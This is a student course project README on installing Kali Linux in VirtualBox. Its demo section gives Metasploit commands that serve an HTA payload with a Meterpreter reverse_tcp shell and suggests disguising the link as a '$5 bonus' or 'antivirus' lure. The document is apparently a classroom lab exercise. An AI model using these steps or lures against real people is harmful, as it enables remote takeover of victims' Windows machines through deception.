## SOULEYMANE BAH AND FAHIM
### CSN150


# KALI LINUX 

Kali Linux is an open-source, Debian-based Linux distribution geared towards various information security tasks, such as Penetration Testing, Security Research, Computer Forensics and Reverse Engineering.

# REFERENCE  
https://www.kali.org/docs/installation/hard-disk-install/

# SYNOPSIS

The purpose of this project is to install kali linux on virtual box machine and use it to practice attacks any server or any PC . this is only for test purpose only and meant to demonstrate potential security flaws.
What does the program do? 

Kali Linux is mainly used for advanced Penetration Testing and Security Auditing. Kali contains several hundred tools which are geared towards various information security tasks, such as Penetration Testing, Security research, Computer Forensics and Reverse Engineering.

What problem does the application solve?
# USE CASES 
---->> Penetration Testing

---->> Security research

---->> Computer Forensics and Reverse Engineering

# INSTALLATION 

## create kali linux in VM 
I  opened my VirtualBox

--->>>then go new

--->>> then I created a new virtual machine 

--->>>name:kali then click 

--->>>next I created memory size RAM then 

--->>>next create your hard disc then create

<img width="582" alt="p1" src="https://user-images.githubusercontent.com/90642756/141928563-cca9a8e6-c7a7-4d3f-a88c-c818e597ef3c.PNG">
<img width="567" alt="p2" src="https://user-images.githubusercontent.com/90642756/141928564-ac14245f-9a34-4d8b-8da7-e94440758ee4.PNG">
<img width="566" alt="p3" src="https://user-images.githubusercontent.com/90642756/141928566-62f55d22-2d78-4a02-a4c4-55259b8f4b5d.PNG">

Finally, navigate to Storage settings. Add the downloaded Kali image to a storage device under Controller: IDE. 

--->>>Click the disk icon to search for the image. Once finished click on OK.

--->>>Then Click the Start icon to begin installing Kali.

<img width="593" alt="p4" src="https://user-images.githubusercontent.com/90642756/141928567-55e09682-495a-472c-afce-effe12e2fa42.PNG">

# Installing and Setting Up Kali Linux

 After you booted the installation menu by clicking Start, a new VM VirtualBox window appears with the Kali welcome screen.
 Select the Graphical install option and go through the following installation steps for setting up Kali Linux in VirtualBox.
 
<img width="547" alt="p5" src="https://user-images.githubusercontent.com/90642756/141928568-f6069667-91c4-4f89-aa17-76f8bc39456b.PNG">

--->>>Select a language. Choose the default language for the system .

<img width="545" alt="p6" src="https://user-images.githubusercontent.com/90642756/141928569-2e68ad91-ff5e-4df5-8dc3-77fc33518268.PNG">

--->>>Select your location. Find and select your country from the list (or choose “other”).

<img width="544" alt="p7" src="https://user-images.githubusercontent.com/90642756/141928570-e30606a5-45ef-46d0-8689-549e5964bf3d.PNG">

--->>>Configure the keyboard. Decide which keymap to use. In most cases, the best option is to select American English.

<img width="542" alt="p8" src="https://user-images.githubusercontent.com/90642756/141928571-92742e77-b5f2-47f1-8a44-20505b0a5f50.PNG">

--->>>Configure the network. First, enter a hostname for the system and click Continue

<img width="543" alt="p9" src="https://user-images.githubusercontent.com/90642756/141928573-2b4f44c7-4cbb-407a-b615-9dc9d76fce38.PNG">

--->>>Next,  domain name if you don’t have domain name click continue.

--->>>Set up users and passwords. Create a strong password for the system administrator account.

<img width="540" alt="p10" src="https://user-images.githubusercontent.com/90642756/141928574-f6b227d7-aecc-496a-8c16-3661993bd076.PNG">

--->>>Configure the clock. Select your time zone from the available options. Choice and then continue.

--->>>Partition disks. Select how you would like to partition the hard disk.

<img width="542" alt="p11" src="https://user-images.githubusercontent.com/90642756/141928575-dc8e9ba1-2e7f-455a-8dd7-255532acc64c.PNG">

--->>>Then, select which disk you want to use for partitioning. As you created a single virtual hard disk before.

--->>>Next, select the scheme for partitioning. If you are a new user, go for All files in one partition.

<img width="537" alt="p12" src="https://user-images.githubusercontent.com/90642756/141928577-12eeade1-53e2-4642-94c1-0f40820ff3b7.PNG">

--->>>The wizard gives you an overview of the configured partitions. 

--->>>Continue by navigating to Finish partitioning and write changes to disk.

--->>>Click Continue and confirm with Yes.

<img width="544" alt="p13" src="https://user-images.githubusercontent.com/90642756/141928578-ca41a1ee-0a10-4d0f-9bc9-ff6d181780b3.PNG">

Configure the package manager. Select whether you want to use a network mirror and click Continue.
Install the GRUB boot loader on a hard disk. Select Yes and Continue. Then, select a boot loader device to ensure the newly installed system is bootable.
Once you receive the message Installation is complete, click Continue to reboot your VM.

--->>> Finally, login using your usersame and password

<img width="544" alt="p14" src="https://user-images.githubusercontent.com/90642756/143159615-aecaac40-ba42-4820-a98a-cb0cf1ad276f.PNG">

# DEMO :
## Open kali linux terminal

--->>> update your kali linux using the command:
#apt-get update
#apt-get upgrade

--->>> log the system to attack tape:
#msfconsole

## We have two method 
### first method

--->>> when you are in the console tape

#use exploit/windows/misc/hta_server

--->>> open a new terminal to find your IP address and tape

#ifconfig

#set lhost "your Ip address"
#set srvhost "your Ip address"

--->>>set payload following comand

#set payload windows/meterpreter/reverse_tcp
#set lport 8111 

--->>>tape exploit
#exploit

--->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 

--->>>to connect over the sessions 

#sessions -i 1

### second method

--->>> when you are in the console tape

'''$ use windows/misc/hta_server'''

#set uripath /name it like (get$5bonus) or (antivirus) etc....

--->>>tape exploit

#exploit

--->>>copy the link from your terminal then open a browser and then paste it and download it and run it after 

--->>>to connect over the sessions 

#sessions -i 1


### We used the second method for the demo

https://user-images.githubusercontent.com/90642756/143676387-923a100d-630e-474c-b2d0-cfd163b6a16e.mp4

# FINAL REVIEW :

Kali Linux is definitely a best Linux distro for someone who want to learn and improve their skills in Penetration testing, Metasploit, the most famous tool amoung the security researchers, comes inbuilt with Kali Linux. Other famous and great tools includes wireshark etc. . its easy to use if you have used any of the Linux distro like Ubuntu in your school.
# What we learned about kali linux 

Kali Linux is a security distribution of Linux derived from Debian and specifically designed for computer forensics and advanced penetration testing. Kali Linux has over 600 preinstalled penetration-testing applications to discover. Each program with its unique flexibility and use case.

